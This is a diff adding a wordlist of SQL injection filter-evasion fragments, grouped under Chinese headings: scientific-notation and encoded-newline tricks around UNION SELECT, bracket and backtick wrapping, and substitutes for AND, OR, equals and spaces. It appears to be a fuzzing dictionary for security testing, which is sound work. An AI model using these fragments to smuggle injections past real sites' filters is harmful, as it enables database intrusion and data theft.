@@ -1,0 +1,69 @@
+# 高级绕过 - 科学计数法
+1e0UNION SELECT
+0e0UNION SELECT
+1.0UNION SELECT
+
+# 高级绕过 - 换行符
+%0aUNION%0aSELECT
+%0dUNION%0dSELECT
+%0a%0dUNION%0a%0dSELECT
+
+# 高级绕过 - 括号包裹
+(SELECT)
+((SELECT))
+(((SELECT)))
+(1)AND(1)=(1)
+(1)OR(1)=(1)
+
+# 高级绕过 - 反引号 (MySQL)
+`SELECT`
+`UNION`
+`AND`
+`OR`
+
+# 高级绕过 - 方括号 (MSSQL)
+[SELECT]
+[UNION]
+[AND]
+[OR]
+
+# 高级绕过 - 花括号
+{SELECT}
+{UNION}
+{fn SELECT}
+{fn CONCAT()}
+
+# 高级绕过 - 特殊函数替代
+# AND 替代
+&&
+%26%26
+LIKE 1
+RLIKE 1
+REGEXP 1
+BETWEEN 1 AND 1
+IN (1)
+NOT IN (0)
+
+# OR 替代
+||
+%7c%7c
+XOR 0
+NOT 0
+
+# 等号替代
+LIKE
+RLIKE
+REGEXP
+<>
+!=
+NOT LIKE
+BETWEEN x AND x
+IN (x)
+
+# 空格替代 (高级)
+%09%09
+%0a%0a
+%0d%0a
+/*--*/
+/*%00*/
+/*!*/
